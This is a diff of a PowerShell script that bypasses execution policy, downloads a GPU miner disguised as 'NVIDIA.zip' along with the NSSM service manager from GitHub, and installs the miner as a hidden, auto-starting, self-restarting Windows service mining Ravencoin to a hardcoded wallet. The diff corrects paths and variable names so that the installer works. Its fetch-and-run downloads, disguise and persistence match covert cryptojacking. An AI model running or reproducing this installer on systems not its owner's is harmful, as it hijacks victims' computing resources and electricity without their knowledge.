@@ -1,19 +1,21 @@
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-$xmrigFolder = "C:\rigel"
+$rigelFolder = "C:\rigel"
 $serviceName = "rigel"
-New-Item -ItemType Directory -Force -Path $xmrigFolder | Out-Null
+New-Item -ItemType Directory -Force -Path $rigelFolder | Out-Null
 $zipUrl = "https://github.com/GALVINVN/GPU/releases/download/session/NVIDIA.zip"
 $zipPath = "$env:TEMP\NVIDIA.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
-Expand-Archive -Path $zipPath -DestinationPath $xmrigFolder -Force
-$rvn-pool = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "rvn-pool.bat" | Select-Object -First 1 -ExpandProperty FullName
+Expand-Archive -Path $zipPath -DestinationPath $rigelFolder -Force
+$rvnpool = Get-ChildItem -Path $rigelFolder -Recurse -Filter "rigel.exe" | Select-Object -First 1 -ExpandProperty FullName
 Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/nssm-2.24.zip -OutFile C:\nssm-2.24.zip
-$nssmZipPath = "$env:C:\nssm-2.24.zip"
-Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
-$nssmExe = "C:\xmrig\nssm-2.24\win64\nssm.exe"
+$nssmZipPath = "C:\nssm-2.24.zip"
+Expand-Archive -Path $nssmZipPath -DestinationPath $rigelFolder -Force
+$nssmExe = "$rigelFolder\nssm-2.24\win64\nssm.exe"
 $wallet = "RX2bYm1j6XVoChhFkvVUpahZCRebVfCuz4"
-$worker = "x2"
-$threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
+$worker = "x1"
+$algorithm = "kawpow"
+$coin = "rvn"
+$pool = "stratum+tcp://rvn.2miners.com:6060"
 $appParams = "-a $algorithm " +
              "--coin $coin " +
              "-o $pool " +
@@ -26,9 +28,9 @@ if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
     & $nssmExe stop $serviceName 2>$null
     & $nssmExe remove $serviceName confirm 2>$null
 }
-& $nssmExe install $serviceName $rvn-pool
+& $nssmExe install $serviceName $rvnpool
 & $nssmExe set $serviceName AppParameters $appParams
-& $nssmExe set $serviceName AppDirectory $xmrigFolder
+& $nssmExe set $serviceName AppDirectory $rigelFolder
 & $nssmExe set $serviceName AppNoConsole 1
 & $nssmExe set $serviceName Start SERVICE_AUTO_START
 & $nssmExe set $serviceName AppExit Default Restart
